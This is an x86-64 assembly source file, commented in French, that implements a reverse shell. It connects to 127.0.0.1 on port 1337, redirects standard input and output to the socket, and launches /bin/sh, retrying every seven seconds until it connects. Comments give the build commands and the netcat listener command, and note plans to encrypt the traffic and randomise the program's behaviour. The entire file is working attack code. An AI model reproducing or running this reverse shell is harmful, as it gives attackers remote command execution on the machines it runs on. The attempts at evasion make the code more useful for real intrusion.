global _start
extern write
extern read
extern exit
extern nano_sleep
extern execve
extern dup2
;essayer de chiffrer le flux 
;essayer de mettre de fonctionnement au hasard 

;nasm -f elf64 main.s -o main.o
;nasm -f elf64 fun.s -o fun.o
;ld -o progAssembly main.o fun.o


;nc -lvp 1337 = ecoute sur le port 1337


section .data
    sockaddr:
        dw 2    
        dw 0x3905 ; 0x3905 = 0x05 0x39 = 1337p
        dd 0x0100007F
        dq 0

    msg:
        conn_test_msg db ">> Connexion vers machine", 0
        conn_test_msg_len equ $ - conn_test_msg

        sock_init_msg db ">> Socket initialisation", 0
        sock_init_msg_len equ $ - sock_init_msg

        socket_err_msg db "socket initialisation error", 0
        socket_err_msg_len equ $ - socket_err_msg

        bind_err_msg db "failed bind socket", 0
        bind_err_msg_len equ $ - bind_err_msg

        lstn_err_msg db "failed listen socket", 0
        lstn_err_msg_len equ $ - lstn_err_msg

        accept_msg db"attack connected", 0
        accept_msg_len equ $ - accept_msg

        create_shll_err_msg db "failed to create shell", 0
        create_shll_msg_err_len equ $ - create_shll_err_msg

        create_shll_msg db "shell created", 0
        create_shll_msg_len equ $ - create_shll_msg  

    timespec:
        dq 7 ;rewind toute les 7 sec
        dq 0         
    
    shell:
        db "/bin/sh", 0
        argv dq shell, 0
        env dq 0

section .bss
    sockfd resq 1

section .text

_start:
.connection:
    mov rdi, 2
    mov rsi, msg
    mov rdx, sock_init_msg_len
    call write  

    ;socket creation
    mov rax, 41
    mov rdi, 2
    mov rsi, 1
    mov rdx, 0
    syscall
    mov [sockfd], rax ;stock socket fd

    ;tentative de connection
    mov rdi, rax
    lea rsi, [rel sockaddr]
    mov rdx, 16
    mov rax, 42
    syscall
    test rax, rax
    js .sleep ;si erreur alors sleep

    mov rdi, 2
    mov rsi, msg
    mov rdx, conn_test_msg_len
    call write

    mov rsi, 0
.redirection:
    mov rdi, [sockfd]
    call dup2 ; duplication du fd
    inc rsi
    cmp rsi, 3
    jne .redirection ;si erreur redirection
 
    ;creation reverse shell
    lea rdi, [rel shell]
    lea rsi, [rel argv]
    lea rdx, [rel env]
    call execve
    ;si erreur alors sleep

.error: ;gestion erreur 
    mov rdi, 2
    mov rsi, create_shll_err_msg
    mov rdx, create_shll_msg_err_len
    call write
    
    mov rdi, 0
    call exit

    
.sleep:
    lea rdi, [rel timespec]
    mov rsi, 0
    mov rax, 35
    syscall
    jmp .connection ;si erreur alors recommence
